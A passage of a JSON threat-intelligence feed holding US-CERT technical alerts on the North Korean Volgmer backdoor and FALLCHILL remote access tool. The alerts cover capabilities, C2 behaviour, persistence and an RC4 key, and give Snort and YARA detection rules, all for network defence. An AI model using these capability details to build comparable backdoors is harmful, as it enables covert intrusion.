VU#584653</a></li>\n\t\t\t\t</ul>\n\t\t\n\t\t<h3>Revision History</h3>\n\t\t<ul>\n\t\t\t\t\t<li>January 4, 2018: Initial version</li>\n\t\t\t\t\t\t<li>January 5, 2018: Updated vendor information links for Citrix, Mozilla, and IBM in the table and added links to Debian, Fedora Project, and Fortinet</li>\n\t\t\t\t\t\t<li>January 8, 2018: Added links to DragonflyBSD, Juniper, LLVM, NetApp, Qubes, and Synology</li>\n\t\t\t\t\t\t<li>January 9, 2018: Updated Solution Section</li>\n\t\t\t\t\t\t<li>January 10, 2018: Added links to Cisco and Nutanix</li>\n\t\t\t\t\t\t<li>January 17, 2018: Added note to Mitigation section and links to Oracle and Ubuntu</li>\n\t\t\t\t\t\t<li>January 18, 2018: Updated Description, Impact, and Solution Sections, and added an additional link</li>\n\t\t\t\t\t\t<li>January 19, 2018: Added link to HP</li>\n\t\t\t\t\t\t<li>January 31, 2018: Provided additional links and updated Description and Mitigation sections</li>\n\t\t\t\t\t</ul>\n\t\t<hr />\n\t\t<p>This product is provided subject to this <a href=\"http://www.us-cert.gov/privacy/notification\">Notification</a> and this <a href=\"http://www.us-cert.gov/privacy/\">Privacy &amp; Use</a> policy.</p>\t\t<br />"
				}
			],
			"created_by_ref": "US-CERT",
			"created": "2018-01-04T18:47:21.000Z"
		},
		{
			"type": "report",
			"title": "TA17-318B: HIDDEN COBRA – North Korean Trojan: Volgmer",
			"name": "TA17-318B: HIDDEN COBRA – North Korean Trojan: Volgmer",
			"id": "report-cf69a02d-b400-48be-b4c1-4abc06b7b720",
			"description": "Original release date: November 14, 2017 | Last revised: November 22, 2017<br />\n\t\t<h3>Systems Affected</h3>\n\t\t<p>Network systems</p>\t\t\n\t\t<h3>Overview</h3>\n\t\t<p>This joint Technical Alert (TA) is the result of analytic efforts between the Department of Homeland Security (DHS) and the Federal Bureau of Investigation (FBI). Working with U.S. government partners, DHS and FBI identified Internet Protocol (IP) addresses and other indicators of compromise (IOCs) associated with a Trojan malware variant used by the North Korean government—commonly known as Volgmer. The U.S. Government refers to malicious cyber activity by the North Korean government as HIDDEN COBRA. For more information on HIDDEN COBRA activity, visit <a href=\"https://www.us-cert.gov/hiddencobra\">https://www.us-cert.gov/hiddencobra</a>.</p><p>FBI has high confidence that HIDDEN COBRA actors are using the IP addresses—listed in this report’s IOC files—to maintain a presence on victims’ networks and to further network exploitation. DHS and FBI are distributing these IP addresses to enable network defense and reduce exposure to North Korean government malicious cyber activity.</p><p>This alert includes IOCs related to HIDDEN COBRA, IP addresses linked to systems infected with Volgmer malware, malware descriptions, and associated signatures. This alert also includes suggested response actions to the IOCs provided, recommended mitigation techniques, and information on reporting incidents. If users or administrators detect activity associated with the Volgmer malware, they should immediately flag it, report it to the DHS National Cybersecurity and Communications Integration Center (NCCIC) or the FBI Cyber Watch (CyWatch), and give it the highest priority for enhanced mitigation.</p><p>For a downloadable copy of IOCs, see:</p><ul><li>IOCs (<a href=\"https://www.us-cert.gov/sites/default/files/publications/TA-17-318B-IOCs.csv\">.csv</a>)</li><li>IOCs (<a href=\"https://www.us-cert.gov/sites/default/files/publications/TA-17-318B-IOCs.xml\">.stix</a>)</li></ul><p>NCCIC conducted analysis on five files associated with or identified as Volgmer malware and produced a Malware Analysis Report (MAR). MAR-10135536-D examines the tactics, techniques, and procedures observed. For a downloadable copy of the MAR, see:</p><ul><li>MAR (<a href=\"https://www.us-cert.gov/sites/default/files/publications/MAR-10135536-D_WHITE_S508C.PDF\">.pdf</a>)</li><li>MAR IOCs (<a href=\"https://www.us-cert.gov/sites/default/files/publications/MAR-10135536-D_WHITE_stix.xml\">.stix</a>)</li></ul>\t\t\n\t\t<h3>Description</h3>\n\t\t<p>Volgmer is a backdoor Trojan designed to provide covert access to a compromised system. Since at least 2013, HIDDEN COBRA actors have been observed using Volgmer malware in the wild to target the government, financial, automotive, and media industries.</p><p>It is suspected that spear phishing is the primary delivery mechanism for Volgmer infections; however, HIDDEN COBRA actors use a suite of custom tools, some of which could also be used to initially compromise a system. Therefore, it is possible that additional HIDDEN COBRA malware may be present on network infrastructure compromised with Volgmer</p><p>The U.S. Government has analyzed Volgmer’s infrastructure and have identified it on systems using both dynamic and static IP addresses. At least 94 static IP addresses were identified, as well as dynamic IP addresses registered across various countries. The greatest concentrations of dynamic IPs addresses are identified below by approximate percentage:</p><ul><li>India (772 IPs) 25.4 percent</li><li>Iran (373 IPs) 12.3 percent</li><li>Pakistan (343 IPs) 11.3 percent</li><li>Saudi Arabia (182 IPs) 6 percent</li><li>Taiwan (169 IPs) 5.6 percent</li><li>Thailand (140 IPs) 4.6 percent</li><li>Sri Lanka (121 IPs) 4 percent</li><li>China (82 IPs, including Hong Kong (12)) 2.7 percent</li><li>Vietnam (80 IPs) 2.6 percent</li><li>Indonesia (68 IPs) 2.2 percent</li><li>Russia (68 IPs) 2.2 percent</li></ul><h3><strong>Technical Details</strong></h3><p>As a backdoor Trojan, Volgmer has several capabilities including: gathering system information, updating service registry keys, downloading and uploading files, executing commands, terminating processes, and listing directories. In one of the samples received for analysis, the US-CERT Code Analysis Team observed botnet controller functionality.</p><p>Volgmer payloads have been observed in 32-bit form as either executables or dynamic-link library (.dll) files. The malware uses a custom binary protocol to beacon back to the command and control (C2) server, often via TCP port 8080 or 8088, with some payloads implementing Secure Socket Layer (SSL) encryption to obfuscate communications.</p><p>Malicious actors commonly maintain persistence on a victim’s system by installing the malware-as-a-service. Volgmer queries the system and randomly selects a service in which to install a copy of itself. The malware then overwrites the ServiceDLL entry in the selected service's registry entry. In some cases, HIDDEN COBRA actors give the created service a pseudo-random name that may be composed of various hardcoded words.</p><h3><strong>Detection and Response</strong></h3><p>This alert’s IOC files provide HIDDEN COBRA indicators related to Volgmer. DHS and FBI recommend that network administrators review the information provided, identify whether any of the provided IP addresses fall within their organizations’ allocated IP address space, and—if found—take necessary measures to remove the malware.</p><p>When reviewing network perimeter logs for the IP addresses, organizations may find instances of these IP addresses attempting to connect to their systems. Upon reviewing the traffic from these IP addresses, system owners may find some traffic relates to malicious activity and some traffic relates to legitimate activity.</p><h3>Network Signatures and Host-Based Rules</h3><p>This section contains network signatures and host-based rules that can be used to detect malicious activity associated with HIDDEN COBRA actors. Although created using a comprehensive vetting process, the possibility of false positives always remains. These signatures and rules should be used to supplement analysis and should not be used as a sole source of attributing this activity to HIDDEN COBRA actors.</p><h4>Network Signatures</h4><p><code>alert tcp any any -&gt; any any (msg:\"Malformed_UA\"; content:\"User-Agent: Mozillar/\"; depth:500; sid:99999999;)</code></p><p>___________________________________________________________________________________________________</p><h4>YARA Rules</h4><p><code>rule volgmer<br />{<br />meta:<br />    description = \"Malformed User Agent\"<br />strings:<br />    $s = \"Mozillar/\"<br />condition:<br />    (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and $s<br />}</code></p>\t\t\n\t\t<h3>Impact</h3>\n\t\t<p>A successful network intrusion can have severe impacts, particularly if the compromise becomes public and sensitive information is exposed. Possible impacts include</p><ul><li>temporary or permanent loss of sensitive or proprietary information,</li><li>disruption to regular operations,</li><li>financial losses incurred to restore systems and files, and</li><li>potential harm to an organization’s reputation.</li></ul>\t\t\n\t\t<h3>Solution</h3>\n\t\t<h4><strong><em>Mitigation Strategies</em></strong></h4><p>DHS recommends that users and administrators use the following best practices as preventive measures to protect their computer networks:</p><ul><li>Use application whitelisting to help prevent malicious software and unapproved programs from running. Application whitelisting is one of the best security strategies as it allows only specified programs to run, while blocking all others, including malicious software.</li><li>Keep operating systems and software up-to-date with the latest patches. Vulnerable applications and operating systems are the target of most attacks. Patching with the latest updates greatly reduces the number of exploitable entry points available to an attacker.</li><li>Maintain up-to-date antivirus software, and scan all software downloaded from the Internet before executing.</li><li>Restrict users’ abilities (permissions) to install and run unwanted software applications, and apply the principle of “least privilege” to all systems and services. Restricting these privileges may prevent malware from running or limit its capability to spread through the network.</li><li>Avoid enabling macros from email attachments. If a user opens the attachment and enables macros, embedded code will execute the malware on the machine. For enterprises or organizations, it may be best to block email messages with attachments from suspicious sources. For information on safely handling email attachments, see <a href=\"https://www.us-cert.gov/sites/default/files/publications/emailscams_0905.pdf\">Recognizing and Avoiding Email Scams</a>. Follow safe practices when browsing the web. See <a href=\"https://www.us-cert.gov/ncas/tips/ST04-003\">Good Security Habits</a> and <a href=\"https://www.us-cert.gov/ncas/tips/ST06-008\">Safeguarding Your Data</a> for additional details.</li><li>Do not follow unsolicited web links in emails. See <a href=\"https://www.us-cert.gov/ncas/tips/ST04-014\">Avoiding Social Engineering and Phishing Attacks</a> for more information.</li></ul><h4><strong><em>Response to Unauthorized Network Access</em></strong></h4><ul><li><strong>Contact DHS or your local FBI office immediately.</strong> To report an intrusion and request resources for incident response or technical assistance, contact DHS NCCIC (<a href=\"https://www.us-cert.govmailto:NCCICCustomerService@hq.dhs.gov\">NCCICCustomerService@hq.dhs.gov</a> or 888-282-0870), FBI through a local field office, or the FBI’s Cyber Division (<a href=\"https://www.us-cert.govmailto:CyWatch@fbi.gov\">CyWatch@fbi.gov</a> or 855-292-3937).</li></ul>\t\t\n\t\t<h3>References</h3>\n\t\t<ul>\n\t\t\t\t</ul>\n\t\t\n\t\t<h3>Revision History</h3>\n\t\t<ul>\n\t\t\t\t\t<li>November 14, 2017: Initial version</li>\n\t\t\t\t\t</ul>\n\t\t<hr />\n\t\t<p>This product is provided subject to this <a href=\"http://www.us-cert.gov/privacy/notification\">Notification</a> and this <a href=\"http://www.us-cert.gov/privacy/\">Privacy &amp; Use</a> policy.</p>\t\t<br />",
			"external_references": [
				{
					"external_id": "10204 at https://www.us-cert.gov",
					"url": "https://www.us-cert.gov/ncas/alerts/TA17-318B",
					"source_name": "open source",
					"description": "Original release date: November 14, 2017 | Last revised: November 22, 2017<br />\n\t\t<h3>Systems Affected</h3>\n\t\t<p>Network systems</p>\t\t\n\t\t<h3>Overview</h3>\n\t\t<p>This joint Technical Alert (TA) is the result of analytic efforts between the Department of Homeland Security (DHS) and the Federal Bureau of Investigation (FBI). Working with U.S. government partners, DHS and FBI identified Internet Protocol (IP) addresses and other indicators of compromise (IOCs) associated with a Trojan malware variant used by the North Korean government—commonly known as Volgmer. The U.S. Government refers to malicious cyber activity by the North Korean government as HIDDEN COBRA. For more information on HIDDEN COBRA activity, visit <a href=\"https://www.us-cert.gov/hiddencobra\">https://www.us-cert.gov/hiddencobra</a>.</p><p>FBI has high confidence that HIDDEN COBRA actors are using the IP addresses—listed in this report’s IOC files—to maintain a presence on victims’ networks and to further network exploitation. DHS and FBI are distributing these IP addresses to enable network defense and reduce exposure to North Korean government malicious cyber activity.</p><p>This alert includes IOCs related to HIDDEN COBRA, IP addresses linked to systems infected with Volgmer malware, malware descriptions, and associated signatures. This alert also includes suggested response actions to the IOCs provided, recommended mitigation techniques, and information on reporting incidents. If users or administrators detect activity associated with the Volgmer malware, they should immediately flag it, report it to the DHS National Cybersecurity and Communications Integration Center (NCCIC) or the FBI Cyber Watch (CyWatch), and give it the highest priority for enhanced mitigation.</p><p>For a downloadable copy of IOCs, see:</p><ul><li>IOCs (<a href=\"https://www.us-cert.gov/sites/default/files/publications/TA-17-318B-IOCs.csv\">.csv</a>)</li><li>IOCs (<a href=\"https://www.us-cert.gov/sites/default/files/publications/TA-17-318B-IOCs.xml\">.stix</a>)</li></ul><p>NCCIC conducted analysis on five files associated with or identified as Volgmer malware and produced a Malware Analysis Report (MAR). MAR-10135536-D examines the tactics, techniques, and procedures observed. For a downloadable copy of the MAR, see:</p><ul><li>MAR (<a href=\"https://www.us-cert.gov/sites/default/files/publications/MAR-10135536-D_WHITE_S508C.PDF\">.pdf</a>)</li><li>MAR IOCs (<a href=\"https://www.us-cert.gov/sites/default/files/publications/MAR-10135536-D_WHITE_stix.xml\">.stix</a>)</li></ul>\t\t\n\t\t<h3>Description</h3>\n\t\t<p>Volgmer is a backdoor Trojan designed to provide covert access to a compromised system. Since at least 2013, HIDDEN COBRA actors have been observed using Volgmer malware in the wild to target the government, financial, automotive, and media industries.</p><p>It is suspected that spear phishing is the primary delivery mechanism for Volgmer infections; however, HIDDEN COBRA actors use a suite of custom tools, some of which could also be used to initially compromise a system. Therefore, it is possible that additional HIDDEN COBRA malware may be present on network infrastructure compromised with Volgmer</p><p>The U.S. Government has analyzed Volgmer’s infrastructure and have identified it on systems using both dynamic and static IP addresses. At least 94 static IP addresses were identified, as well as dynamic IP addresses registered across various countries. The greatest concentrations of dynamic IPs addresses are identified below by approximate percentage:</p><ul><li>India (772 IPs) 25.4 percent</li><li>Iran (373 IPs) 12.3 percent</li><li>Pakistan (343 IPs) 11.3 percent</li><li>Saudi Arabia (182 IPs) 6 percent</li><li>Taiwan (169 IPs) 5.6 percent</li><li>Thailand (140 IPs) 4.6 percent</li><li>Sri Lanka (121 IPs) 4 percent</li><li>China (82 IPs, including Hong Kong (12)) 2.7 percent</li><li>Vietnam (80 IPs) 2.6 percent</li><li>Indonesia (68 IPs) 2.2 percent</li><li>Russia (68 IPs) 2.2 percent</li></ul><h3><strong>Technical Details</strong></h3><p>As a backdoor Trojan, Volgmer has several capabilities including: gathering system information, updating service registry keys, downloading and uploading files, executing commands, terminating processes, and listing directories. In one of the samples received for analysis, the US-CERT Code Analysis Team observed botnet controller functionality.</p><p>Volgmer payloads have been observed in 32-bit form as either executables or dynamic-link library (.dll) files. The malware uses a custom binary protocol to beacon back to the command and control (C2) server, often via TCP port 8080 or 8088, with some payloads implementing Secure Socket Layer (SSL) encryption to obfuscate communications.</p><p>Malicious actors commonly maintain persistence on a victim’s system by installing the malware-as-a-service. Volgmer queries the system and randomly selects a service in which to install a copy of itself. The malware then overwrites the ServiceDLL entry in the selected service's registry entry. In some cases, HIDDEN COBRA actors give the created service a pseudo-random name that may be composed of various hardcoded words.</p><h3><strong>Detection and Response</strong></h3><p>This alert’s IOC files provide HIDDEN COBRA indicators related to Volgmer. DHS and FBI recommend that network administrators review the information provided, identify whether any of the provided IP addresses fall within their organizations’ allocated IP address space, and—if found—take necessary measures to remove the malware.</p><p>When reviewing network perimeter logs for the IP addresses, organizations may find instances of these IP addresses attempting to connect to their systems. Upon reviewing the traffic from these IP addresses, system owners may find some traffic relates to malicious activity and some traffic relates to legitimate activity.</p><h3>Network Signatures and Host-Based Rules</h3><p>This section contains network signatures and host-based rules that can be used to detect malicious activity associated with HIDDEN COBRA actors. Although created using a comprehensive vetting process, the possibility of false positives always remains. These signatures and rules should be used to supplement analysis and should not be used as a sole source of attributing this activity to HIDDEN COBRA actors.</p><h4>Network Signatures</h4><p><code>alert tcp any any -&gt; any any (msg:\"Malformed_UA\"; content:\"User-Agent: Mozillar/\"; depth:500; sid:99999999;)</code></p><p>___________________________________________________________________________________________________</p><h4>YARA Rules</h4><p><code>rule volgmer<br />{<br />meta:<br />    description = \"Malformed User Agent\"<br />strings:<br />    $s = \"Mozillar/\"<br />condition:<br />    (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and $s<br />}</code></p>\t\t\n\t\t<h3>Impact</h3>\n\t\t<p>A successful network intrusion can have severe impacts, particularly if the compromise becomes public and sensitive information is exposed. Possible impacts include</p><ul><li>temporary or permanent loss of sensitive or proprietary information,</li><li>disruption to regular operations,</li><li>financial losses incurred to restore systems and files, and</li><li>potential harm to an organization’s reputation.</li></ul>\t\t\n\t\t<h3>Solution</h3>\n\t\t<h4><strong><em>Mitigation Strategies</em></strong></h4><p>DHS recommends that users and administrators use the following best practices as preventive measures to protect their computer networks:</p><ul><li>Use application whitelisting to help prevent malicious software and unapproved programs from running. Application whitelisting is one of the best security strategies as it allows only specified programs to run, while blocking all others, including malicious software.</li><li>Keep operating systems and software up-to-date with the latest patches. Vulnerable applications and operating systems are the target of most attacks. Patching with the latest updates greatly reduces the number of exploitable entry points available to an attacker.</li><li>Maintain up-to-date antivirus software, and scan all software downloaded from the Internet before executing.</li><li>Restrict users’ abilities (permissions) to install and run unwanted software applications, and apply the principle of “least privilege” to all systems and services. Restricting these privileges may prevent malware from running or limit its capability to spread through the network.</li><li>Avoid enabling macros from email attachments. If a user opens the attachment and enables macros, embedded code will execute the malware on the machine. For enterprises or organizations, it may be best to block email messages with attachments from suspicious sources. For information on safely handling email attachments, see <a href=\"https://www.us-cert.gov/sites/default/files/publications/emailscams_0905.pdf\">Recognizing and Avoiding Email Scams</a>. Follow safe practices when browsing the web. See <a href=\"https://www.us-cert.gov/ncas/tips/ST04-003\">Good Security Habits</a> and <a href=\"https://www.us-cert.gov/ncas/tips/ST06-008\">Safeguarding Your Data</a> for additional details.</li><li>Do not follow unsolicited web links in emails. See <a href=\"https://www.us-cert.gov/ncas/tips/ST04-014\">Avoiding Social Engineering and Phishing Attacks</a> for more information.</li></ul><h4><strong><em>Response to Unauthorized Network Access</em></strong></h4><ul><li><strong>Contact DHS or your local FBI office immediately.</strong> To report an intrusion and request resources for incident response or technical assistance, contact DHS NCCIC (<a href=\"https://www.us-cert.govmailto:NCCICCustomerService@hq.dhs.gov\">NCCICCustomerService@hq.dhs.gov</a> or 888-282-0870), FBI through a local field office, or the FBI’s Cyber Division (<a href=\"https://www.us-cert.govmailto:CyWatch@fbi.gov\">CyWatch@fbi.gov</a> or 855-292-3937).</li></ul>\t\t\n\t\t<h3>References</h3>\n\t\t<ul>\n\t\t\t\t</ul>\n\t\t\n\t\t<h3>Revision History</h3>\n\t\t<ul>\n\t\t\t\t\t<li>November 14, 2017: Initial version</li>\n\t\t\t\t\t</ul>\n\t\t<hr />\n\t\t<p>This product is provided subject to this <a href=\"http://www.us-cert.gov/privacy/notification\">Notification</a> and this <a href=\"http://www.us-cert.gov/privacy/\">Privacy &amp; Use</a> policy.</p>\t\t<br />"
				}
			],
			"created_by_ref": "US-CERT",
			"created": "2017-11-14T19:00:38.000Z"
		},
		{
			"type": "report",
			"title": "TA17-318A: HIDDEN COBRA – North Korean Remote Administration Tool: FALLCHILL",
			"name": "TA17-318A: HIDDEN COBRA – North Korean Remote Administration Tool: FALLCHILL",
			"id": "report-2c870b79-1fa7-4301-b5d4-07995fef3ddc",
			"description": "Original release date: November 14, 2017 | Last revised: November 22, 2017<br />\n\t\t<h3>Systems Affected</h3>\n\t\t<p>Network systems</p>\t\t\n\t\t<h3>Overview</h3>\n\t\t<p>This joint Technical Alert (TA) is the result of analytic efforts between the Department of Homeland Security (DHS) and the Federal Bureau of Investigation (FBI). Working with U.S. government partners, DHS and FBI identified Internet Protocol (IP) addresses and other indicators of compromise (IOCs) associated with a remote administration tool (RAT) used by the North Korean government—commonly known as FALLCHILL. The U.S. Government refers to malicious cyber activity by the North Korean government as HIDDEN COBRA. For more information on HIDDEN COBRA activity, visit <a href=\"https://www.us-cert.gov/hiddencobra\">https://www.us-cert.gov/hiddencobra</a>.</p><p>FBI has high confidence that HIDDEN COBRA actors are using the IP addresses—listed in this report’s IOC files—to maintain a presence on victims’ networks and to further network exploitation. DHS and FBI are distributing these IP addresses to enable network defense and reduce exposure to any North Korean government malicious cyber activity.</p><p>This alert includes IOCs related to HIDDEN COBRA, IP addresses linked to systems infected with FALLCHILL malware, malware descriptions, and associated signatures. This alert also includes suggested response actions to the IOCs provided, recommended mitigation techniques, and information on reporting incidents. If users or administrators detect activity associated with the FALLCHILL malware, they should immediately flag it, report it to the DHS National Cybersecurity and Communications Integration Center (NCCIC) or the FBI Cyber Watch (CyWatch), and give it the highest priority for enhanced mitigation.</p><p>For a downloadable copy of IOCs, see:</p><ul><li>IOCs (<a href=\"https://www.us-cert.gov/sites/default/files/publications/TA-17-318A-IOCs.csv\">.csv</a>)</li><li>IOCs (<a href=\"https://www.us-cert.gov/sites/default/files/publications/TA-17-318A-IOCs.xml\">.stix</a>)</li></ul><p>NCCIC conducted analysis on two samples of FALLCHILL malware and produced a Malware Analysis Report (MAR). MAR-10135536-A examines the tactics, techniques, and procedures observed in the malware. For a downloadable copy of the MAR, see:</p><ul><li>MAR (<a href=\"https://www.us-cert.gov/sites/default/files/publications/MAR-10135536-A_WHITE_S508C.pdf\">.pdf</a>)</li><li>MAR IOCs (<a href=\"https://www.us-cert.gov/sites/default/files/publications/MAR-10135536-A_WHITE_stix.xml\">.stix</a>)</li></ul>\t\t\n\t\t<h3>Description</h3>\n\t\t<p>According to trusted third-party reporting, HIDDEN COBRA actors have likely been using FALLCHILL malware since 2016 to target the aerospace, telecommunications, and finance industries. The malware is a fully functional RAT with multiple commands that the actors can issue from a command and control (C2) server to a victim’s system via dual proxies. FALLCHILL typically infects a system as a file dropped by other HIDDEN COBRA malware or as a file downloaded unknowingly by users when visiting sites compromised by HIDDEN COBRA actors. HIDDEN COBRA actors use an external tool or dropper to install the FALLCHILL malware-as-a-service to establish persistence. Because of this, additional HIDDEN COBRA malware may be present on systems compromised with FALLCHILL.</p><p>During analysis of the infrastructure used by FALLCHILL malware, the U.S. Government identified 83 network nodes. Additionally, using publicly available registration information, the U.S. Government identified the countries in which the infected IP addresses are registered.</p><h3><strong>Technical Details</strong></h3><p>FALLCHILL is the primary component of a C2 infrastructure that uses multiple proxies to obfuscate network traffic between HIDDEN COBRA actors and a victim’s system. According to trusted third-party reporting, communication flows from the victim’s system to HIDDEN COBRA actors using a series of proxies as shown in figure 1.</p><p><img alt=\"HIDDEN COBRA Communication Flow\" src=\"https://www.us-cert.gov/sites/default/files/publications/alert-graphic-01.png\" style=\"width: 786px; height: 191px;\" /></p><h5>Figure 1. HIDDEN COBRA Communication Flow</h5><p>FALLCHILL uses fake Transport Layer Security (TLS) communications, encoding the data with RC4 encryption with the following key: [0d 06 09 2a 86 48 86 f7 0d 01 01 01 05 00 03 82]. FALLCHILL collects basic system information and beacons the following to the C2:</p><ul><li>operating system (OS) version information,</li><li>processor information,</li><li>system name,</li><li>local IP address information,</li><li>unique generated ID, and</li><li>media access control (MAC) address.</li></ul><p>FALLCHILL contains the following built-in functions for remote operations that provide various capabilities on a victim’s system:</p><ul><li>retrieve information about all installed disks, including the disk type and the amount of free space on the disk;</li><li>create, start, and terminate a new process and its primary thread;</li><li>search, read, write, move, and execute files;</li><li>get and modify file or directory timestamps;</li><li>change the current directory for a process or file; and</li><li>delete malware and artifacts associated with the malware from the infected system.</li></ul><h3>Detection and Response</h3><p>This alert’s IOC files provide HIDDEN COBRA indicators related to FALLCHILL. DHS and FBI recommend that network administrators review the information provided, identify whether any of the provided IP addresses fall within their organizations’ allocated IP address space, and—if found—take necessary measures to remove the malware.</p><p>When reviewing network perimeter logs for the IP addresses, organizations may find instances of these IP addresses attempting to connect to their systems. Upon reviewing the traffic from these IP addresses, system owners may find some traffic relates to malicious activity and some traffic relates to legitimate activity.</p><h3>Network Signatures and Host-Based Rules</h3><p>This section contains network signatures and host-based rules that can be used to detect malicious activity associated with HIDDEN COBRA actors. Although created using a comprehensive vetting process, the possibility of false positives always remains. These signatures and rules should be used to supplement analysis and should not be used as a sole source of attributing this activity to HIDDEN COBRA actors.</p><h4>Network Signatures</h4><p><code>alert tcp any any -&gt; any any (msg:\"Malicious SSL 01 Detected\";content:\"|17 03 01 00 08|\";  pcre:\"/\\x17\\x03\\x01\\x00\\x08.{4}\\x04\\x88\\x4d\\x76/\"; rev:1; sid:2;)</code></p><p>___________________________________________________________________________________________</p><p><code>alert tcp any any -&gt; any any (msg:\"Malicious SSL 02 Detected\";content:\"|17 03 01 00 08|\";  pcre:\"/\\x17\\x03\\x01\\x00\\x08.{4}\\x06\\x88\\x4d\\x76/\"; rev:1; sid:3;)</code></p><p>___________________________________________________________________________________________</p><p><code>alert tcp any any -&gt; any any (msg:\"Malicious SSL 03 Detected\";content:\"|17 03 01 00 08|\";  pcre:\"/\\x17\\x03\\x01\\x00\\x08.{4}\\xb2\\x63\\x70\\x7b/\"; rev:1; sid:4;)</code></p><p>___________________________________________________________________________________________</p><p><code>alert tcp any any -&gt; any any (msg:\"Malicious SSL 04 Detected\";content:\"|17 03 01 00 08|\";  pcre:\"/\\x17\\x03\\x01\\x00\\x08.{4}\\xb0\\x63\\x70\\x7b/\"; rev:1; sid:5;)</code></p><div>___________________________________________________________________________________________</div><h4>YARA Rules</h4><p>The following rules were provided to NCCIC by a trusted third party for the purpose of assisting in the identification of malware associated with this alert.</p><p>THIS DHS/NCCIC MATERIAL IS FURNISHED ON AN “AS-IS” BASIS.  These rules have been tested and determined to function effectively in a lab environment, but we have no way of knowing if they may function differently in a production network.  Anyone using these rules are encouraged to test them using a data set representitive of their environment.</p><p><code>rule rc4_stack_key_fallchill<br />{<br />meta:<br />    description = \"rc4_stack_key\"<br />strings:<br />    $stack_key = { 0d 06 09 2a ?? ?? ?? ?? 86 48 86 f7 ?? ?? ?? ?? 0d 01 01 01 ?? ?? ?? ?? 05 00 03 82 41 8b c9 41 8b d1 49 8b 40 08 48 ff c2 88 4c 02 ff ff c1 81 f9 00 01 00 00 7c eb }<br />condition:<br />    (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and $stack_key<br />}</code></p><p><code>rule success_fail_codes_fallchill</code></p><p><code>{<br />meta:<br />    description = \"success_fail_codes\"<br />strings:<br />    $s0 = { 68 7a 34 12 00 }  <br />    $s1 = { ba 7a 34 12 00 }  <br />    $f0 = { 68 5c 34 12 00 }  <br />    $f1 = { ba 5c 34 12 00 }<br />condition:<br />    (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and (($s0 and $f0) or ($s1 and $f1))<br />}</code></p><p>___________________________________________________________________________________________</p>\t\t\n\t\t<h3>Impact</h3>\n\t\t<p>A successful network intrusion can have severe impacts, particularly if the compromise becomes public and sensitive information is exposed. Possible impacts include:</p><ul><li>temporary or permanent loss of sensitive or proprietary information,</li><li>disruption to regular operations,</li><li>financial losses incurred to restore systems and files, and</li><li>potential harm to an organization’s reputation.</li></ul>\t\t\n\t\t<h3>Solution</h3>\n\t\t<h4><strong><em>Mitigation Strategies</em></strong></h4><p>DHS recommends that users and administrators use the following best practices as preventive measures to protect their computer networks:</p><ul><li>Use application whitelisting to help prevent malicious software and unapproved programs from running. Application whitelisting is one of the best security strategies as it allows only specified programs to run, while blocking all others, including malicious software.</li><li>Keep operating systems and software up-to-date with the latest patches. Vulnerable applications and operating systems are the target of most attacks. Patching with the latest updates greatly reduces the number of exploitable entry points available to an attacker.</li><li>Maintain up-to-date antivirus software, and scan all software downloaded from the Internet before executing.</li><li>Restrict users’ abilities (permissions) to install and run unwanted software applications, and apply the principle of “least privilege” to all systems and services. Restricting these privileges may prevent malware from running or limit its capability to spread through the network.</li><li>Avoid enabling macros from email attachments. If a user opens the attachment and enables macros, embedded code will execute the malware on the machine. For enterprises or organizations, it may be best to block email messages with attachments from suspicious sources. For information on safely handling email attachments, see <a href=\"https://www.us-cert.gov/sites/default/files/publications/emailscams_0905.pdf\">Recognizing and Avoiding Email Scams</a>. Follow safe practices when browsing the web. See <a href=\"https://www.us-cert.gov/ncas/tips/ST04-003\">Good Security Habits</a> and <a href=\"https://www.us-cert.gov/ncas/tips/ST06-008\">Safeguarding Your Data</a> for additional details.</li><li>Do not follow unsolicited web links in emails. See <a href=\"https://www.us-cert.gov/ncas/tips/ST04-014\">Avoiding Social Engineering and Phishing Attacks</a> for more information.</li></ul><h4><strong><em>Response to Unauthorized Network Access</em></strong></h4><ul><li><strong>Contact DHS or your local FBI office immediately.</strong> To report an intrusion and request resources for incident response or technical assistance, contact DHS NCCIC (<a href=\"https://www.us-cert.govmailto:NCCICCustomerService@hq.dhs.gov\">NCCICCustomerService@hq.dhs.gov</a> or 888-282-0870), FBI through a local field office, or the FBI’s Cyber Division (<a href=\"https://www.us-cert.govmailto:CyWatch@fbi.gov\">CyWatch@fbi.gov</a> or 855-292-3937).</li></ul><p> </p>\t\t\n\t\t<h3>References</h3>\n\t\t<ul>\n\t\t\t\t</ul>\n\t\t\n\t\t<h3>Revision History</h3>\n\t\t<ul>\n\t\t\t\t\t<li>November 14, 2017: Initial version</li>\n\t\t\t\t\t</ul>\n\t\t<hr />\n\t\t<p>This product is provided subject to this <a href=\"http://www.us-cert.gov/privacy/notification\">Notification</a> and this <a href=\"http://www.us-cert.gov/privacy/\">Privacy &amp; Use</a> policy.</p>\t\t<br />",
			"external_references": [
				{
					"external_id": "10197 at https://www.us-cert.gov",
					"url": "https://www.us-cert.gov/ncas/alerts/TA17-318A",
					"source_name": "open source",
					"description": "Original release date: November 14, 2017 | Last revised: November 22, 2017<br />\n\t\t<h3>Systems Affected</h3>\n\t\t<p>Network systems</p>\t\t\n\t\t<h3>Overview</h3>\n\t\t<p>This joint Technical Alert (TA) is the result of analytic efforts between the Department of Homeland Security (DHS) and the Federal Bureau of Investigation (FBI). Working with U.S. government partners, DHS and FBI identified Internet Protocol (IP) addresses and other indicators of compromise (IOCs) associated with a remote administration tool (RAT) used by the North Korean government—commonly known as FALLCHILL. The U.S. Government refers to malicious cyber activity by the North Korean government as HIDDEN COBRA. For more information on HIDDEN COBRA activity, visit <a href=\"https://www.us-cert.gov/hiddencobra\">https://www.us-cert.gov/hiddencobra</a>.</p><p>FBI has high confidence that HIDDEN COBRA actors are using the IP addresses—listed in this report’s IOC files—to maintain a presence on victims’ networks and to further network exploitation. DHS and FBI are distributing these IP addresses to enable network defense and reduce exposure to any North Korean government malicious cyber activity.</p><p>This alert includes IOCs related to HIDDEN COBRA, IP addresses linked to systems infected with FALLCHILL malware, malware descriptions, and associated signatures. This alert also includes suggested response actions to the IOCs provided, recommended mitigation techniques, and information on reporting incidents. If users or administrators detect activity associated with the FALLCHILL malware, they should immediately flag it, report it to the DHS National Cybersecurity and Communications Integration Center (NCCIC) or the FBI Cyber Watch (CyWatch), and give it the highest priority for enhanced mitigation.</p><p>For a downloadable copy of IOCs, see:</p><ul><li>IOCs (<a 